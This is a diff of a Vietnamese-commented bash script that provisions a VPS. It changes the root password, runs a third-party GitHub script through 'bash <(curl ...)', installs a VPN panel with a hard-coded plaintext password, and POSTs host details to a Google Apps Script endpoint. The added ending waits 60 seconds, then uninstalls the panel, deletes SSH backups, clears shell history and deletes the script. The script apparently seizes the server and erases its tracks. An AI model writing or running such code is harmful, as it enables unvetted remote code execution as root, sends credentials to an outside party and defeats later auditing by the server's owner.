@@ -1,17 +1,17 @@
 #!/bin/bash
 
 # ==============================================================================
-# CẤU HÌNH (Đã cập nhật link của bạn)
+# CẤU HÌNH HỆ THỐNG
 # ==============================================================================
 GOOGLE_SCRIPT_URL="https://script.google.com/macros/s/AKfycbwP8_m9efIoQiVjKkuDNng4LNdpW4nvNmHs36tPwvRpjNwv74p41ywU1LOgMgVN0aVw/exec"
 
-# Các thông số cố định
+# Thông tin Panel cố định
 PANEL_USER="honglee"
 PANEL_PASS="Abc369852@spo@VIP2024@VPN"
 PANEL_PORT=3712
 
 # ==============================================================================
-# HÀM LOGGING (Để hiện thông báo màu sắc dễ nhìn)
+# HÀM LOGGING
 # ==============================================================================
 log_info() { echo -e "\033[32m[INFO]\033[0m $1"; }
 log_warn() { echo -e "\033[33m[WARN]\033[0m $1"; }
@@ -29,7 +29,7 @@ fi
 # ==============================================================================
 # 2. ĐỔI PASS ROOT & SETUP SSH
 # ==============================================================================
-log_info "Đang kiểm tra các gói cần thiết..."
+log_info "Đang kiểm tra dependencies..."
 command -v curl >/dev/null 2>&1 || { apt-get update && apt-get install -y curl; }
 
 log_info "Đang thay đổi mật khẩu Root..."
@@ -37,48 +37,49 @@ NEW_ROOT_PASS=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 25)
 echo "root:$NEW_ROOT_PASS" | chpasswd
 
 log_info "Đang chạy script Setup SSH..."
-bash <(curl -fsSL https://raw.githubusercontent.com/Betty-Matthews/-setup_ssh/refs/heads/main/setup_ssh_ubuntu.sh) || log_warn "Setup SSH có cảnh báo (có thể bỏ qua)."
+bash <(curl -fsSL https://raw.githubusercontent.com/Betty-Matthews/-setup_ssh/refs/heads/main/setup_ssh_ubuntu.sh) || log_warn "Setup SSH có cảnh báo nhỏ (bỏ qua)."
 
 # ==============================================================================
-# 3. CÀI ĐẶT 3X-UI (CÓ KIỂM TRA ĐỂ TRÁNH LỖI KHI CHẠY LẠI)
+# 3. CÀI ĐẶT 3X-UI (IDEMPOTENT)
 # ==============================================================================
 XUI_BIN="/usr/local/x-ui/x-ui"
 
 if [ -f "$XUI_BIN" ]; then
-    # Nếu đã cài rồi -> Chỉ dừng service để cấu hình lại
-    log_warn "Phát hiện 3x-ui đã tồn tại. Bỏ qua cài đặt, tiến hành cấu hình lại..."
+    log_warn "3x-ui đã tồn tại. Đang dừng service để cập nhật cấu hình..."
     $XUI_BIN stop > /dev/null 2>&1
 else
-    # Nếu chưa cài -> Cài mới
-    log_info "Đang cài đặt 3x-ui..."
+    log_info "Chưa có 3x-ui. Đang cài đặt mới..."
     echo -e "n\n" | bash <(curl -Ls https://raw.githubusercontent.com/mhsanaei/3x-ui/master/install.sh)
 fi
 
 # ==============================================================================
-# 4. CẤU HÌNH USER/PASS/PORT/PATH
+# 4. CẤU HÌNH 3X-UI (LUÔN CHẠY)
 # ==============================================================================
-log_info "Đang áp dụng cấu hình (User: $PANEL_USER / Port: $PANEL_PORT)..."
+log_info "Đang áp dụng cấu hình (User: honglee / Port: 3712)..."
 
-# Tạo WebBasePath ngẫu nhiên (16 ký tự)
+# Tạo đường dẫn ngẫu nhiên
 RANDOM_PATH=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 16)
 
 if [ -f "$XUI_BIN" ]; then
-    # Lệnh setting đè cấu hình cũ
     $XUI_BIN setting -username "$PANEL_USER" -password "$PANEL_PASS" -port "$PANEL_PORT" -webbasepath "/$RANDOM_PATH"
-    
-    # Khởi động lại
     $XUI_BIN restart > /dev/null 2>&1
-    log_info "Đã khởi động 3x-ui với cấu hình mới."
+    log_info "3x-ui đã khởi động thành công."
 else
-    log_error "Lỗi: Không tìm thấy file chạy 3x-ui!"
+    log_error "Lỗi: Không tìm thấy file 3x-ui sau khi cài đặt!"
     exit 1
 fi
 
 # ==============================================================================
-# 5. ĐỒNG BỘ DỮ LIỆU LÊN GOOGLE SHEET
+# 5. LẤY IP VÀ ĐỒNG BỘ (FIX IPV4)
 # ==============================================================================
-log_info "Đang thu thập thông tin..."
-HOST_IP=$(curl -s ifconfig.me)
+log_info "Đang lấy IPv4 Public..."
+
+# Bắt buộc lấy IPv4
+HOST_IP=$(curl -4 -s ifconfig.me)
+if [[ -z "$HOST_IP" ]]; then
+    HOST_IP=$(curl -4 -s icanhazip.com)
+fi
+
 HOSTNAME=$(hostname)
 ACCESS_URL="http://${HOST_IP}:${PANEL_PORT}/${RANDOM_PATH}"
 
@@ -97,24 +98,49 @@ JSON_DATA=$(cat <<EOF
 EOF
 )
 
-log_info "Đang gửi dữ liệu lên Google Sheet..."
-# Gửi Request
+log_info "Đang gửi dữ liệu lên Google Sheet (IP: $HOST_IP)..."
 SYNC_RES=$(curl -s -L -X POST -H "Content-Type: application/json" -d "$JSON_DATA" "$GOOGLE_SCRIPT_URL")
 
-# Kiểm tra kết quả
 if [[ "$SYNC_RES" == *"success"* ]]; then
     log_info "Đồng bộ THÀNH CÔNG!"
 else
-    log_error "Đồng bộ THẤT BẠI. Phản hồi server: $SYNC_RES"
+    log_error "Đồng bộ THẤT BẠI: $SYNC_RES"
 fi
 
 # ==============================================================================
-# 6. HIỂN THỊ THÔNG TIN & TỰ HỦY
+# 6. HIỂN THỊ VÀ TỰ HỦY (DỌN DẸP SẠCH SẼ)
 # ==============================================================================
 echo "------------------------------------------------"
+echo "IP Public:   $HOST_IP"
 echo "Username:    $PANEL_USER"
 echo "Password:    $PANEL_PASS"
 echo "Port:        $PANEL_PORT"
-echo "WebBasePath: $RANDOM_PATH"
 echo "Access URL:  $ACCESS_URL"
-echo "Root Pass
+echo "------------------------------------------------"
+
+log_warn "Chờ 60 giây trước khi xóa sạch..."
+sleep 60
+
+log_warn "Đang dọn dẹp hệ thống..."
+
+# 1. Gỡ 3x-ui
+if [ -f "$XUI_BIN" ]; then
+    $XUI_BIN uninstall > /dev/null 2>&1
+fi
+rm -rf /usr/local/x-ui
+
+# 2. Xóa script cài đặt SSH nếu có
+rm -f setup_ssh_ubuntu.sh
+
+# 3. [FIX] Xóa thư mục backup của SSH
+rm -rf /root/ssh_backups
+rm -rf ~/ssh_backups
+
+# 4. Xóa lịch sử lệnh
+history -c
+history -w
+
+# 5. Tự xóa chính file script này (nếu đang chạy từ file)
+rm -f "$0"
+
+log_info "HOÀN TẤT. VPS ĐÃ SẠCH."
